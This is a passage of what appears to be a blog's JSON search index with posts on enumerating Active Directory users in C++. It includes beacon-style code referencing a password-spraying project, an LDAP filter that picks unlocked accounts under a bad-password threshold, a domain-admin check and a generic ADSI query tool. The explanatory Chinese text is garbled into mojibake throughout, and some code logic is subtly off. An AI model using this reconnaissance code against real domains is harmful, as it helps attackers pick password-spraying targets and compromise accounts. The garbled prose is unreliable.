L&quot;(&amp;(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime&gt;=1))(!(badPwdCount&gt;=%ls))(sAMAccountName=%ls))&quot;; // Only enabled accounts PADS_SEARCH_HANDLE å¥æŸ„ æŸ¥è¯¢åˆ°ç»“æœåï¼Œéœ€è¦è°ƒç”¨ IDirectorySearch çš„å…¶ä»–æ–¹æ³•å¯¹ç»“æœè¿›è¡Œæšä¸¾ï¼ŒConvertColToUAStruct ä¸ºè‡ªå®šä¹‰å°è£…çš„æŸ¥è¯¢ç»“æœå¤„ç†å‡½æ•°ï¼Œå‚è€ƒ ã€ADã€‘ç›¸å…³å‡½æ•°è°ƒç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// æšä¸¾æŸ¥è¯¢ç»“æœçš„å¤§è‡´æµç¨‹// Return specified propertieshr = pContainerToSearch-&gt;ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &amp;hSearch);if (FAILED(hr)) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to execute search.\\n&quot;); goto CleanUp;&#125;if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row of data. hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; UserAccount userAct; userAct.strAccountType = L&quot;3&quot;; userAct.strDomain = pdcInfo-&gt;DomainName; userAct.strIsDomain = &quot;1&quot;; userAct.strPwdExpireTime = &quot;never&quot;; userAct.bAdmin = FALSE; // Keep track of count. iCount++; // Loop through the array of passed column names. while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; ConvertColToUAStruct(col, userAct); pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; if (pszColumn != NULL) &#123; FreeADsMem(pszColumn); &#125; &#125; Users.emplace_back(userAct); // Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch);&#125; 0x03 å¼€æºä»£ç å’Œé¡¹ç›® QueryADUser holdyounger/QueryADUser: æŸ¥è¯¢ADåŸŸå†…ç”¨æˆ·ä¿¡æ¯ æŸ¥è¯¢é€»è¾‘åŸºæœ¬ä¸€ç›´ï¼Œå‚è€ƒäº† SprayAD é¡¹ç›®ã€‚å¦å¤–æ·»åŠ äº†åˆ¤æ–­ åŸŸç®¡ç†å‘˜ çš„é€»è¾‘ï¼Œåªæœ‰åœ¨åŸŸç®¡ç†å‘˜çš„æœºå™¨ä¸Šæ‰è·å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·ã€‚ åˆ¤æ–­å½“å‰æœºå™¨æ˜¯å¦åŸŸç®¡ç†å‘˜ï¼Œå‚æ•°1ä¸º IDirectorySearchï¼Œ éœ€è¦ä¼ å…¥æ‰“æ¥çš„ LDAP å¥æŸ„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152BOOL IsDomainAdmin(_In_ IDirectorySearch* pContainerToSearch, _In_ LPCWSTR lpwFilterName)&#123; BOOL bRet = FALSE; HRESULT hr = S_OK; WCHAR wcSearchFilter[BUF_SIZE] = &#123; 0 &#125;; LPCWSTR pszAttrFilter[] = &#123; L&quot;isCriticalSystemObject&quot;, // boolean L&quot;sAMAccountName&quot;, // boolean &#125;; LPCWSTR lpwFormat = L&quot;(&amp;(objectClass=user)(objectCategory=person)((sAMAccountName=%ls)))&quot;; // Only enabled accounts // (!(userAccountControl:1.2.840.113556.1.4.803:=2)) PUSER_INFO pUserInfo = NULL; INT iCount = 0; DWORD x = 0L; LPWSTR pszColumn = NULL; IADs* pRoot = NULL; IID IADsIID; ADS_SEARCH_COLUMN col; DWORD dwAccountsFailed = 0; DWORD dwAccountsSuccess = 0; vector&lt;UserAccount&gt; uAccounts; _ADsOpenObject ADsOpenObject = (_ADsOpenObject) GetProcAddress(GetModuleHandleA(&quot;Activeds.dll&quot;), &quot;ADsOpenObject&quot;); if (ADsOpenObject == NULL) &#123; return S_FALSE; &#125; _FreeADsMem FreeADsMem = (_FreeADsMem) GetProcAddress(GetModuleHandleA(&quot;Activeds.dll&quot;), &quot;FreeADsMem&quot;); if (FreeADsMem == NULL) &#123; return S_FALSE; &#125; if (!pContainerToSearch) &#123; return E_POINTER; &#125; // Calculate Program run time. LARGE_INTEGER frequency; LARGE_INTEGER start; LARGE_INTEGER end; double interval; QueryPerformanceFrequency(&amp;frequency); QueryPerformanceCounter(&amp;start); // Specify subtree search ADS_SEARCHPREF_INFO SearchPrefs; SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE; SearchPrefs.vValue.dwType = ADSTYPE_INTEGER; SearchPrefs.vValue.Integer = 1000; DWORD dwNumPrefs = 1; // Handle used for searching ADS_SEARCH_HANDLE hSearch = NULL; // Set the search preference hr = pContainerToSearch-&gt;SetSearchPreference(&amp;SearchPrefs, dwNumPrefs); if (FAILED(hr)) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to set search preference.\\n&quot;); goto CleanUp; &#125; // Add the filter. if (lpwFilterName == NULL) &#123; // lpwFilter = L&quot;*&quot;; BeaconPrintf(CALLBACK_ERROR, &quot;Empty username!\\n&quot;); return hr; &#125; swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwFilterName); pUserInfo = (PUSER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO)); if (pUserInfo == NULL) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to allocate UserInfo memory.\\n&quot;); goto CleanUp; &#125; // Return specified properties hr = pContainerToSearch-&gt;ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &amp;hSearch); if (FAILED(hr)) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to execute search.\\n&quot;); goto CleanUp; &#125; if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row of data. hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; UserAccount uAccount; // Keep track of count. iCount++; uAccount.bAdmin = FALSE; // Loop through the array of passed column names. while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; ConvertColToUAStruct(col, uAccount); pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; if (pszColumn != NULL) &#123; FreeADsMem(pszColumn); &#125; &#125; uAccounts.emplace_back(uAccount); // Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch); &#125; if (uAccounts.size() == 1) &#123; if (uAccounts[0].bAdmin == 1 &amp;&amp; uAccounts[0].UserName.CompareNoCase(&quot;Administrator&quot;) == 0) &#123; bRet = TRUE; &#125; &#125; if (SUCCEEDED(hr) &amp;&amp; 0 == iCount) &#123; hr = S_FALSE; &#125; if (dwAccountsSuccess == 0) &#123; BeaconPrintToStreamW(L&quot;[-] Failed =&gt; %ls\\\\%ls (Skip!)\\n&quot;, pdcInfo-&gt;DomainName, lpwFilterName); &#125;CleanUp: if (pUserInfo != NULL) &#123; HeapFree(GetProcessHeap(), 0, pUserInfo); &#125; return bRet;&#125; æµ‹è¯•ï¼š è·å–å½“å‰ç™»å½•ç”¨æˆ·å 12345678910111213141516BOOL GetCurUserName(CString &amp;strUserName)&#123; BOOL bRet = FALSE; char username[BUF_SIZE]; DWORD usernameSize = sizeof(username); if (FALSE == GetUserName(username, &amp;usernameSize)) &#123; goto End; &#125;; strUserName = username; bRet = TRUE; printf(&quot;gethostname result: %S \\n&quot;, username);End: return bRet;&#125; 1234567891011121314151617181920void test()&#123; if (IsDomainAdmin(pContainerToSearch, CStringW(&quot;Administrator&quot;))) &#123; &#125; CString DomainUserName; // è·å–ç”¨æˆ·å if (FALSE == GetCurUserName(DomainUserName)) &#123; &#125; if (IsDomainAdmin(pContainerToSearch, CStringW(userName))) &#123; &#125;&#125; QueryADObject.cpp æ¥æºï¼šHomework-of-C-Language/QueryADObject.cpp at e21cb129e15fd2186bd8ec1310bcc23c38ab209b Â· 3gstudent/Homework-of-C-Language 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481//Reference://https://github.com/microsoft/Windows-classic-samples/tree/master/Samples/Win7Samples/netds/adsi/activedir/QueryUsers/vc//https://github.com/outflanknl/Recon-AD#include &lt;stdio.h&gt;#include &lt;objbase.h&gt;#include &lt;activeds.h&gt;#include &lt;sddl.h&gt;#pragma comment(lib, &quot;ADSIid.lib&quot;)#pragma comment(lib, &quot;ActiveDS.Lib&quot;)#pragma comment(lib, &quot;Ole32.Lib&quot;)#pragma comment(lib, &quot;Advapi32.Lib&quot;)#pragma comment(lib, &quot;oleaut32.Lib&quot;)int IS_BUFFER_ENOUGH(UINT maxAlloc, LPWSTR pszTarget, LPCWSTR pszSource, int toCopy = -1) &#123; if (toCopy == -1) &#123; toCopy = wcslen(pszSource); &#125; return maxAlloc - (wcslen(pszTarget) + toCopy + 1);&#125;HRESULT Search(IDirectorySearch *pContainerToSearch, // IDirectorySearch pointer to Partitions container. LPOLESTR szFilter, // Filter for finding specific crossrefs. NULL returns all attributeSchema objects. LPOLESTR *pszPropertiesToReturn, // Properties to return for crossRef objects found. NULL returns all set properties. BOOL bIsVerbose //TRUE means display all properties for the found objects are displayed. //FALSE means only the RDN )&#123; if (!pContainerToSearch) return E_POINTER; LPOLESTR pszNonVerboseList[] = &#123; L&quot;name&quot;,L&quot;distinguishedName&quot; &#125;; unsigned long ulNonVbPropsCount = 2; wprintf(L&quot;%s\\n&quot;, szFilter); // Specify subtree search ADS_SEARCHPREF_INFO SearchPrefs; SearchPrefs.dwSearchPref = ADS_SEARCHPREF_SEARCH_SCOPE; SearchPrefs.vValue.dwType = ADSTYPE_INTEGER; SearchPrefs.vValue.Integer = ADS_SCOPE_SUBTREE; DWORD dwNumPrefs = 1; // COL for iterations LPOLESTR pszColumn = NULL; ADS_SEARCH_COLUMN col; HRESULT hr; // Interface Pointers IADs *pObj = NULL; IADs *pIADs = NULL; // Handle used for searching ADS_SEARCH_HANDLE hSearch = NULL; // Set the search preference hr = pContainerToSearch-&gt;SetSearchPreference(&amp;SearchPrefs, dwNumPrefs); if (FAILED(hr)) &#123; return hr; &#125; LPOLESTR pszBool = NULL; DWORD dwBool; PSID pObjectSID = NULL; LPOLESTR szSID = NULL; LPOLESTR szDSGUID = new WCHAR[39]; LPGUID pObjectGUID = NULL; FILETIME filetime; SYSTEMTIME systemtime; DATE date; VARIANT varDate; LARGE_INTEGER liValue; LPOLESTR *pszPropertyList = NULL; int iCount = 0; DWORD x = 0L; if (!bIsVerbose) &#123; //Return non-verbose list properties only hr = pContainerToSearch-&gt;ExecuteSearch(szFilter, pszNonVerboseList, ulNonVbPropsCount, &amp;hSearch ); &#125; else &#123; if (!pszPropertiesToReturn) &#123; // Return all properties. hr = pContainerToSearch-&gt;ExecuteSearch(szFilter, NULL, -1L, &amp;hSearch); &#125; else &#123; // Specified subset. pszPropertyList = pszPropertiesToReturn; // Return specified properties hr = pContainerToSearch-&gt;ExecuteSearch(szFilter, pszPropertyList, sizeof(pszPropertyList) / sizeof(LPOLESTR), &amp;hSearch); &#125; &#125; if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row of data hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; // Keep track of count. iCount++; wprintf(L&quot;--------------------------------------------------------------------\\n&quot;); // Loop through the array of passed column names, print the data for each column while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; // Print the data for the column and free the column // Get the data for this column wprintf(L&quot;[+] %s:\\n&quot;, col.pszAttrName); switch (col.dwADsType) &#123; case ADSTYPE_DN_STRING: for (x = 0; x&lt; col.dwNumValues; x++) &#123; if (wcscmp(L&quot;member&quot;, col.pszAttrName) == 0) &#123; IADsNameTranslate *pNto; BSTR bstr; hr = CoCreateInstance(CLSID_NameTranslate, NULL, CLSCTX_INPROC_SERVER, IID_IADsNameTranslate, (void**)&amp;pNto); if (SUCCEEDED(hr)) &#123; hr = pNto-&gt;Set(ADS_NAME_TYPE_1779, col.pADsValues[x].DNString); if (SUCCEEDED(hr)) &#123; hr = pNto-&gt;Get(ADS_NAME_TYPE_NT4, &amp;bstr); wprintf(L&quot; %s\\r\\n&quot;, bstr); SysFreeString(bstr); &#125; pNto-&gt;Release(); &#125; &#125; else &#123; wprintf(L&quot; %s\\r\\n&quot;, col.pADsValues[x].DNString); &#125; &#125; break; case ADSTYPE_CASE_EXACT_STRING: case ADSTYPE_CASE_IGNORE_STRING: case ADSTYPE_PRINTABLE_STRING: case ADSTYPE_NUMERIC_STRING: case ADSTYPE_TYPEDNAME: case ADSTYPE_FAXNUMBER: case ADSTYPE_PATH: case ADSTYPE_OBJECT_CLASS: for (x = 0; x&lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %s\\r\\n&quot;, col.pADsValues[x].CaseIgnoreString); &#125; break; case ADSTYPE_BOOLEAN: for (x = 0; x&lt; col.dwNumValues; x++) &#123; dwBool = col.pADsValues[x].Boolean; pszBool = dwBool ? L&quot;TRUE&quot; : L&quot;FALSE&quot;; wprintf(L&quot; %s\\r\\n&quot;, pszBool); &#125; break; case ADSTYPE_INTEGER: for (x = 0; x&lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %d\\r\\n&quot;, col.pADsValues[x].Integer); &#125; break; case ADSTYPE_OCTET_STRING: if (_wcsicmp(col.pszAttrName, L&quot;objectSID&quot;) == 0) &#123; for (x = 0; x&lt; col.dwNumValues; x++) &#123; pObjectSID = (PSID)(col.pADsValues[x].OctetString.lpValue); // Convert SID to string. ConvertSidToStringSid(pObjectSID, &amp;szSID); wprintf(L&quot; %s\\r\\n&quot;, szSID); LocalFree(szSID); &#125; &#125; else if ((_wcsicmp(col.pszAttrName, L&quot;objectGUID&quot;) == 0)) &#123; for (x = 0; x&lt; col.dwNumValues; x++) &#123; // Cast to LPGUID pObjectGUID = (LPGUID)(col.pADsValues[x].OctetString.lpValue); // Convert GUID to string. ::StringFromGUID2(*pObjectGUID, szDSGUID, 39); // Print the GUID wprintf(L&quot; %s\\r\\n&quot;, szDSGUID); &#125; &#125; else wprintf(L&quot; Value of type Octet String. No Conversion.\\n&quot;); break; case ADSTYPE_UTC_TIME: for (x = 0; x&lt; col.dwNumValues; x++) &#123; systemtime = col.pADsValues[x].UTCTime; if (SystemTimeToVariantTime(&amp;systemtime, &amp;date) != 0) &#123; // Pack in variant.vt varDate.vt = VT_DATE; varDate.date = date; VariantChangeType(&amp;varDate, &amp;varDate, VARIANT_NOVALUEPROP, VT_BSTR); wprintf(L&quot; %s\\r\\n&quot;, varDate.bstrVal); VariantClear(&amp;varDate); &#125; else wprintf(L&quot;[!] Could not convert UTC-Time.\\n&quot;); &#125; break; case ADSTYPE_LARGE_INTEGER: for (x = 0; x&lt; col.dwNumValues; x++) &#123; liValue = col.pADsValues[x].LargeInteger; filetime.dwLowDateTime = liValue.LowPart; filetime.dwHighDateTime = liValue.HighPart; if ((filetime.dwHighDateTime == 0) &amp;&amp; (filetime.dwLowDateTime == 0)) &#123; wprintf(L&quot; No value set.\\n&quot;); &#125; else &#123; // Check for properties of type LargeInteger that represent time // if TRUE, then convert to variant time. if ((0 == wcscmp(L&quot;accountExpires&quot;, col.pszAttrName)) | (0 == wcscmp(L&quot;badPasswordTime&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;lastLogon&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;lastLogoff&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;lockoutTime&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;pwdLastSet&quot;, col.pszAttrName)) ) &#123; // Handle special case for Never Expires where low part is -1 if (filetime.dwLowDateTime == -1) &#123; wprintf(L&quot; Never Expires.\\n&quot;); &#125; else &#123; if (FileTimeToLocalFileTime(&amp;filetime, &amp;filetime) != 0) &#123; if (FileTimeToSystemTime(&amp;filetime, &amp;systemtime) != 0) &#123; if (SystemTimeToVariantTime(&amp;systemtime, &amp;date) != 0) &#123; // Pack in variant.vt varDate.vt = VT_DATE; varDate.date = date; VariantChangeType(&amp;varDate, &amp;varDate, VARIANT_NOVALUEPROP, VT_BSTR); wprintf(L&quot; %s\\r\\n&quot;, varDate.bstrVal); VariantClear(&amp;varDate); &#125; else &#123; wprintf(L&quot; FileTimeToVariantTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToSystemTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToLocalFileTime failed\\n&quot;); &#125; &#125; &#125; else &#123; // Print the LargeInteger. wprintf(L&quot; high: %d low: %d\\r\\n&quot;, filetime.dwHighDateTime, filetime.dwLowDateTime); &#125; &#125; &#125; break; case ADSTYPE_NT_SECURITY_DESCRIPTOR: for (x = 0; x&lt; col.dwNumValues; x++) &#123; wprintf(L&quot; Security descriptor.\\n&quot;); &#125; break; default: wprintf(L&quot;[!] Unknown type %d.\\n&quot;, col.dwADsType); &#125; pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; CoTaskMemFree(pszColumn); &#125; // Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch); &#125; if (SUCCEEDED(hr) &amp;&amp; 0 == iCount) hr = S_FALSE; wprintf(L&quot;--------------------------------------------------------------------\\n&quot;); return hr;&#125;void wmain(int argc, wchar_t *argv[])&#123; if (argc != 4) &#123; printf(&quot;\\nThis program queries for objects in the current user&#x27;s domain.\\n&quot;); printf(&quot;Usage:\\n&quot;); printf(&quot; %ws &lt;ADS path&gt; &lt;search string&gt; &lt;outputdata&gt;\\n&quot;, argv[0]); printf(&quot;Eg.\\n&quot;); printf(&quot; %ws Current \\&quot;(&amp;(objectClass=user)(objectCategory=person))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=computer)(objectClass=computer))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws \\&quot;OU=Domain Controllers,DC=test,DC=com\\&quot; \\&quot;(&amp;(objectCategory=computer)(objectClass=computer))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=group))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=organizationalUnit))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectClass=user)(objectCategory=person)(name=testa))\\&quot; AllData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=computer)(objectClass=computer)(name=COMPUTER01))\\&quot; AllData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=group)(name=Domain Admins))\\&quot; AllData\\n&quot;, argv[0]); return; &#125; int maxAlloc = MAX_PATH * 2; LPOLESTR pszBuffer = new OLECHAR[maxAlloc]; wcscpy_s(pszBuffer, maxAlloc, L&quot;&quot;); if (IS_BUFFER_ENOUGH(maxAlloc, pszBuffer, argv[2]) &gt; 0) &#123; wcscpy_s(pszBuffer, maxAlloc, argv[2]); &#125; else &#123; wprintf(L&quot;Buffer is too small for the argument&quot;); delete[] pszBuffer; return; &#125; BOOL bReturnVerbose = FALSE; if (_wcsicmp(argv[3], L&quot;AllData&quot;) == 0) &#123; bReturnVerbose = TRUE; &#125; CoInitialize(NULL); HRESULT hr = S_OK; // Get rootDSE and the current user&#x27;s domain container DN. IADs *pObject = NULL; IDirectorySearch *pContainerToSearch = NULL; LPOLESTR szPath = new OLECHAR[MAX_PATH]; VARIANT var; hr = ADsOpenObject(L&quot;LDAP://rootDSE&quot;, NULL, NULL, ADS_SECURE_AUTHENTICATION, // Use Secure Authentication IID_IADs, (void**)&amp;pObject); if (FAILED(hr)) &#123; wprintf(L&quot;[!] Could not execute query. Could not bind to LDAP://rootDSE.\\n&quot;); if (pObject) pObject-&gt;Release(); delete[] pszBuffer; delete[] szPath; CoUninitialize(); // Flush STDOUT fflush(stdout); return; &#125; if (SUCCEEDED(hr)) &#123; hr = pObject-&gt;Get(L&quot;defaultNamingContext&quot;, &amp;var); if (SUCCEEDED(hr)) &#123; wcscpy_s(szPath, MAX_PATH, L&quot;LDAP://&quot;); if (_wcsicmp(argv[1], L&quot;Current&quot;) == 0) &#123; // Build path to the domain container. if (IS_BUFFER_ENOUGH(MAX_PATH, szPath, var.bstrVal) &gt; 0) &#123; wcscat_s(szPath, MAX_PATH, var.bstrVal); &#125; else &#123; wprintf(L&quot;[!] Buffer is too small for the domain DN&quot;); delete[] pszBuffer; delete[] szPath; CoUninitialize(); // Flush STDOUT fflush(stdout); return; &#125; &#125; else &#123; if (IS_BUFFER_ENOUGH(MAX_PATH, szPath, argv[1]) &gt; 0) &#123; wcscat_s(szPath, MAX_PATH, argv[1]); &#125; &#125; wprintf(L&quot;%s\\n&quot;, szPath); hr = ADsOpenObject(szPath, NULL, NULL, ADS_SECURE_AUTHENTICATION, // Use Secure Authentication IID_IDirectorySearch, (void**)&amp;pContainerToSearch); if (SUCCEEDED(hr)) &#123; hr = Search(pContainerToSearch, //IDirectorySearch pointer to Partitions container. pszBuffer, NULL, bReturnVerbose ); if (SUCCEEDED(hr)) &#123; if (S_FALSE == hr) wprintf(L&quot;[!] No object could be found.\\n&quot;); &#125; else if (0x8007203e == hr) wprintf(L&quot;[!] Could not execute query. An invalid filter was specified.\\n&quot;); else wprintf(L&quot;[!] Query failed to run. HRESULT: %x\\n&quot;, hr); &#125; else &#123; wprintf(L&quot;[!] Could not execute query. Could not bind to the container.\\n&quot;); &#125; if (pContainerToSearch) pContainerToSearch-&gt;Release(); &#125; VariantClear(&amp;var); &#125; if (pObject) pObject-&gt;Release(); delete[] pszBuffer; delete[] szPath; // Uninitialize COM CoUninitialize(); // Flush STDOUT fflush(stdout);&#125;","tags":[{"name":"windows/AD","slug":"windows-AD","permalink":"https://hodlyounger.github.io/tags/windows-AD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/AD/"}]},{"title":"ã€ADã€‘ç”¨æˆ·å±æ€§","date":"2024-01-19T04:06:36.814Z","path":"A_OS/Windows/AD/ã€ADã€‘ç”¨æˆ·å±æ€§/","text":"æ¦‚è¿°ï¼šAD ç”¨æˆ·å±æ€§ å‚è€ƒé“¾æ¥ï¼š ç”¨æˆ·å¯¹è±¡å±æ€§ - Win32 apps | Microsoft Learn ç”¨æˆ·è´¦æˆ·çŠ¶æ€ UserAccountControl å±æ€§æ ‡å¿— - Windows Server | Microsoft Learn","tags":[{"name":"Windows/AD","slug":"Windows-AD","permalink":"https://hodlyounger.github.io/tags/Windows-AD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/AD/"}]},{"title":"ã€ADã€‘ç›¸å…³å‡½æ•°è°ƒç”¨","date":"2024-01-19T03:03:21.586Z","path":"A_OS/Windows/AD/ã€ADã€‘ç›¸å…³å‡½æ•°è°ƒç”¨/","text":"æ¦‚è¿°ï¼š AD è°ƒç”¨å‡½æ•°ä¸­ç›¸å…³å‡½æ•°çš„ä½¿ç”¨æ•´ç† 0x01 æ—¶é—´è½¬æ¢ ç›¸å…³é“¾æ¥ï¼š FileTimeToSystemTime å‡½æ•° (timezoneapi.h) - Win32 apps | Microsoft Learn å¦‚ä½•å°† Active Directory ä¸­çš„æ—¥æœŸ/æ—¶é—´å±æ€§è½¬æ¢ä¸ºæ ‡å‡†æ—¶é—´æ ¼å¼ - Windows Server | Microsoft Learn 12345678910111213if (_wcsicmp(col.pszAttrName, L&quot;lastLogon&quot;) == 0)&#123; ADS_UTC_TIME tm = col.pADsValues-&gt;UTCTime; SYSTEMTIME monTS; if (FileTimeToSystemTime(reinterpret_cast&lt;PFILETIME&gt;(&amp;tm), &amp;monTS) != FALSE) &#123; CStringA sTime; sTime.Format(&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond); uAccount.strLastLogon = sTime; &#125; uAccount.tmLastLogon = col.pADsValues-&gt;Timestamp.WholeSeconds;&#125; 0x02 å°è£…å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132typedef struct _USERACCOUNT&#123; std::string UserName; // ç”¨æˆ·å std::string strDomain; // æ‰€åœ¨åŸŸ std::string strGroup; // æ‰€åœ¨ç»„ std::string strSID; // SID std::string strHomePath; // home bool bDisabled; // æ˜¯å¦ç¦ç”¨ bool bAdmin; // æ˜¯å¦ç®¡ç†å‘˜ __time64_t tmLastLogon; // æœ€åç™»å½•æ—¶é—´ std::string strLastLogon; // æœ€åç™»å½•æ—¶é—´ unsigned int dwPwStatus; // å¯†ç çŠ¶æ€ï¼Œ å·²è®¾ç½® 1ï¼Œ ç©ºå¯†ç  2ï¼Œ å·²é”å®š 3 åŸŸç”¨æˆ·ï¼š1 éœ€è¦å¯†ç  2 æ— éœ€å¯†ç  std::string strPwdChangeTime; // å¯†ç ä¿®æ”¹æ—¶é—´ std::string strPwdExpireTime; // å¯†ç è¿‡æœŸæ—¶é—´ std::string strAccountType; // 1 æœ¬åœ°è´¦æˆ·ï¼Œ2å…¨å±€è´¦æˆ· 3 åŸŸç”¨æˆ· std::string strIsDomain; // 1 æ˜¯ï¼Œ2ä¸æ˜¯&#125;UserAccount;inline void ConvertColToUAStruct(const ADS_SEARCH_COLUMN&amp; col, UserAccount&amp; uAccount)&#123; DWORD x = 0; if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;sAMAccountName&quot;) == 0) &#123; uAccount.UserName = col.pADsValues-&gt;CaseIgnoreString; &#125; &#125; &#125; else if (col.dwADsType == ADSTYPE_INTEGER) &#123; if (_wcsicmp(col.pszAttrName, L&quot;userAccountControl&quot;) == 0) &#123; uAccount.bDisabled = ((col.pADsValues-&gt;Integer &amp; ADS_UF_ACCOUNTDISABLE) == ADS_UF_ACCOUNTDISABLE) ? TRUE : FALSE; if ((ADS_UF_PASSWD_NOTREQD &amp; col.pADsValues-&gt;Integer) == ADS_UF_PASSWD_NOTREQD) &#123; uAccount.dwPwStatus = PASSWORD_TYPE_EMPTY; &#125; else if ((ADS_UF_LOCKOUT &amp; col.pADsValues-&gt;Integer) == ADS_UF_LOCKOUT) &#123; uAccount.dwPwStatus = PASSWORD_TYPE_LOCK; &#125; else &#123; uAccount.dwPwStatus = PASSWORD_TYPE_REQ; &#125; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;ms-DS-User-Account-Control-Computed&quot;) == 0) &#123; uAccount.bDisabled = ((col.pADsValues-&gt;Integer &amp; ADS_UF_ACCOUNTDISABLE) == ADS_UF_ACCOUNTDISABLE) ? TRUE : FALSE; if ((ADS_UF_LOCKOUT &amp; col.pADsValues-&gt;Integer) == ADS_UF_LOCKOUT) &#123; uAccount.dwPwStatus = PASSWORD_TYPE_LOCK; &#125; &#125; else if (_wcsicmp(col.pszAttrName, 